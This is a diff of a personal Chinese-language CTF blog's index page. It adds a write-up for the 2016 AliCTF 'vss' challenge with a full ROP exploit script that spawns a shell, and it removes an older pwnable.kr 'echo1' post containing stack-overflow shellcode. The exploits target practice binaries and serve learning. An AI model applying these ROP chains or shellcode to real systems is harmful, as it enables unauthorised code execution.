@@ -288,6 +288,133 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/31/alictf-qual-2016-vss/" itemprop="url">
+                  alictf-qual-2016-vss
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-31T00:00:00+08:00" content="2016-07-31">
+              2016-07-31
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/31/alictf-qual-2016-vss/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/31/alictf-qual-2016-vss/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>练习用</p>
+<h2 id="Conclusion">Conclusion</h2><p>之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是<code>open-read-write</code>的方式，后来比赛结束后看了网上发的writeup(我也忘了是看的哪个队的writeup了，所以<strong>Referance</strong>上放不了了)，才知道直接<code>ROP</code>系统调用即可，隔了几个月，重新自己做了下，本地测试</p>
+<h2 id="Trick">Trick</h2><ul>
+<li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>，设置好<code>rax=0x3b;rdi=&#39;/bin/sh\x00&#39;;rsi=0;rdx=0</code></li>
+<li>程序是静态链接，想要的gadgets基本上都能找到</li>
+<li>利用<code>add rsp, 0x58</code>来抬升栈</li>
+</ul>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./vss_72e30bb98bdfbf22307133c16f8c9966'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x4011b0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">add_rsp = <span class="number">0x0046f205</span>    <span class="comment"># add rsp, 0x58 ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x00401937</span>    <span class="comment"># pop rsi       ; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x0043ae05</span>    <span class="comment"># pop rdx       ; ret</span></span><br><span class="line">pop_r12 = <span class="number">0x004004c3</span>    <span class="comment"># pop r12       ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x0046f208</span>    <span class="comment"># pop rax       ; ret</span></span><br><span class="line">mov_rdi = <span class="number">0x00495968</span>    <span class="comment"># mov rdi, rsp  ; call r12</span></span><br><span class="line">syscall = <span class="number">0x004004b8</span>    <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'py'</span> + <span class="string">'A'</span> * <span class="number">70</span></span><br><span class="line">payload +=  l64(add_rsp)</span><br><span class="line">payload =   payload.ljust(<span class="number">0x58</span>, <span class="string">'A'</span>)</span><br><span class="line">payload +=  l64(pop_rsi)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_rdx)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_r12)</span><br><span class="line">payload +=  l64(syscall)</span><br><span class="line">payload +=  l64(pop_rax)</span><br><span class="line">payload +=  l64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=  l64(mov_rdi)</span><br><span class="line">payload +=  <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Password:'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/31/alictf-qual-2016-fb/" itemprop="url">
                   alictf-qual-2016-fb
                 </a>
@@ -769,127 +896,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo1/" itemprop="url">
-                  pwnable.kr-rookiss-echo1
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-echo1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/25/pwnable-rookiss-echo1/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -935,7 +941,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">21</span>
+              <span class="site-state-item-count">22</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
